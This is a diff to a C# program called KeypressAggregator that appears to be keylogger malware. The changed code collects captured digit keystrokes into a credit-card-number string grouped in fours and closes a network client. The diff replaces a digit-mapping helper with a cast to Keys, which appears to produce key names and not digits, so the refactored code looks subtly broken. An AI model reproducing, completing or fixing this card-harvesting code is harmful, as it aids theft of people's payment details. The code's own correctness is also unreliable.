@@ -39,7 +39,7 @@ namespace KeypressAggregator
                 if(ks.Key > 47 && ks.Key < 58)
                 {
                     creditCard += 1;
-                    creditNum += keyValue(ks.Key);
+                    creditNum += (Keys)ks.Key;
                     if (creditCard % 4 == 0)
                     {
                         creditNum += " ";
@@ -70,35 +70,6 @@ namespace KeypressAggregator
             o.Close();
             client.close();
 
-        }
-
-        // A method for figuring out the actual keypress. There is likely a better way to do this. Please
-        // tell me if this is the case. I'm currently on a plane with no internet. I'll probably fix this
-        // later...
-        static String keyValue(int val)
-        {
-            String ret = "NOPE";
-            if (val == 48)
-                ret = "0";
-            else if (val == 49)
-                ret = "1";
-            else if (val == 50)
-                ret = "2";
-            else if (val == 51)
-                ret = "3";
-            else if (val == 52)
-                ret = "4";
-            else if (val == 53)
-                ret = "5";
-            else if (val == 54)
-                ret = "6";
-            else if (val == 55)
-                ret = "7";
-            else if (val == 56)
-                ret = "8";
-            else if (val == 57)
-                ret = "9";
-            return ret;
         }
     }
 }
